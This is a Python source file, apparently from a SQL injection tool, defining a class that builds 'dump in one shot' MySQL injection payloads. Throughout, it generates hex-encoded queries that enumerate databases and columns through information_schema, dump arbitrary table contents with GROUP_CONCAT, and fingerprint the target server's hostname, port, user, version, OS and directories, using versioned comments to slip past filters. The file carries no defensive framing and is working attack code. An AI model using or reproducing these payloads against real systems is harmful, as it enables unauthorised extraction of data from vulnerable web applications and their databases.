import binascii


class Dios:

        
    startSQLi   = "0x3C73716C692D68656C7065723E" # <sqli-helper>
    endSQLi     = "0x3C2F73716C692D68656C7065723E" # </sqli-helper>
    endData     = "0x3c656e642f3e" # <end/>

    def build(self, query):
        return f"(select+concat({self.startSQLi},(select+concat({query})),{self.endSQLi}))"
    
    def dump_data(self, tables, columns, database, level=1):
        response_query  = ''
        if level == 1:
            column_query    = ''

            for column in columns:
                column = column.strip(' ')
                query           = "0x" + self.strTohex(f"<{column}>");
                query           += f",{column},"
                query           += "0x" + self.strTohex(f"</{column}>");
                column_query    += query + ","
            column_query = column_query.strip(",")
            response_query = f"(SELECT+GROUP_CONCAT({column_query},{self.endData})+FROM+{database}.{tables})"
            
        return response_query

    def get_information(self,level=1):
        if level == 1:
            dios = f"(select+concat({self.startSQLi},(select+concat({self.hostname()},{self.port()},{self.user()},{self.version()},{self.database()},{self.os_version()},{self.mechine_version()},{self.base_dir()},{self.data_dir()},{self.ssl()},{self.openssl()},{self.symlink()},{self.socket()})),{self.endSQLi}))"
        return dios

    def show_columns(self, table_name, dbname, level=1):
        if level == 1:
            dios = f"(select+group_concat(column_name)+from+information_schema.columns+where+table_name=0x{self.strTohex(table_name)}+and+table_schema=0x{self.strTohex(dbname)})"
        return dios
    # Get all database
    def databases(self, level=1):
        if level == 1:
            dios = f"(select+group_concat(DISTINCT(table_schema))+from+information_schema.columns)"
        return dios



    def strTohex(self, string):
        hexa = binascii.hexlify(string.encode("utf-8"))
        hexa = hexa.decode("utf-8")

        return hexa

    def hexTostr(self, hexa):
        string = binascii.unhexlify(hexa.encode("utf-8"))
        string = string.decode("utf-8")

        return string
    def addslashes(self, s):
        d = {'"':'\\"', "'":"\\'", "\0":"\\\0", "\\":"\\\\"}
        return ''.join(d.get(c, c) for c in s)


    # Method get Information from target
    # Hostname
    def hostname(self, level=1):
        if level == 1:
            hostname = f"0x{self.strTohex('<hostname()>')},/*!00000@@hostname*/,0x{self.strTohex('</hostname()>')}"
        # print(hostname, level)
        return hostname


    # Port
    def  port(self, level=1):
        if level == 1:
            port = f"0x{self.strTohex('<port()>')},/*!00000@@port*/,0x{self.strTohex('</port()>')}"
        return port


    # Version
    def version(self, level=1):
        if level == 1:
            version = f"0x{self.strTohex('<version>')},/*!00000@@version*/,0x{self.strTohex('</version>')}"
        return version
    

    # User
    def user(self, level=1):
        if level == 1:
            user = f"0x{self.strTohex('<user()>')},/*!00000user()*/,0x{self.strTohex('</user()>')}"
        return user


    # Database
    def database(self, level=1):
        if level == 1:
            database = f"0x{self.strTohex('<schema()>')},/*!00000schema()*/,0x{self.strTohex('</schema()>')}"
        return database
    

    # os_version
    def os_version(self, level=1):
        if level == 1:
            os_version = f"0x{self.strTohex('<os_version>')},/*!00000@@version_compile_os*/,0x{self.strTohex('</os_version>')}"
        return os_version


    # mechine_version
    def mechine_version(self, level=1):
        if level == 1:
            mechine_version = f"0x{self.strTohex('<mechine_version>')},/*!00000@@VERSION_COMPILE_MACHINE*/,0x{self.strTohex('</mechine_version>')}"
        return mechine_version


    # base_dir
    def base_dir(self, level=1):
        if level == 1:
            base_dir = f"0x{self.strTohex('<base_dir>')},/*!00000@@basedir*/,0x{self.strTohex('</base_dir>')}"
        return base_dir


    # data_dir
    def data_dir(self, level=1):
        if level == 1:
            data_dir = f"0x{self.strTohex('<data_dir>')},/*!00000@@datadir*/,0x{self.strTohex('</data_dir>')}"
        return data_dir
 

    # ssl
    def ssl(self, level=1):
        if level == 1:
            ssl = f"0x{self.strTohex('<ssl>')},/*!00000@@GLOBAL.have_ssl*/,0x{self.strTohex('</ssl>')}"
        return ssl


    # openssl
    def openssl(self, level=1):
        if level == 1:
            openssl = f"0x{self.strTohex('<openssl>')},/*!00000@@GLOBAL.have_openssl*/,0x{self.strTohex('</openssl>')}"
        return openssl
    

    # symlink
    def symlink(self, level=1):
        if level == 1:
            symlink = f"0x{self.strTohex('<symlink>')},/*!00000@@GLOBAL.have_symlink*/,0x{self.strTohex('</symlink>')}"
        return symlink


    # socket
    def socket(self, level=1):
        if level == 1:
            socket = f"0x{self.strTohex('<socket>')},/*!00000@@socket*/,0x{self.strTohex('</socket>')}"
        return socket
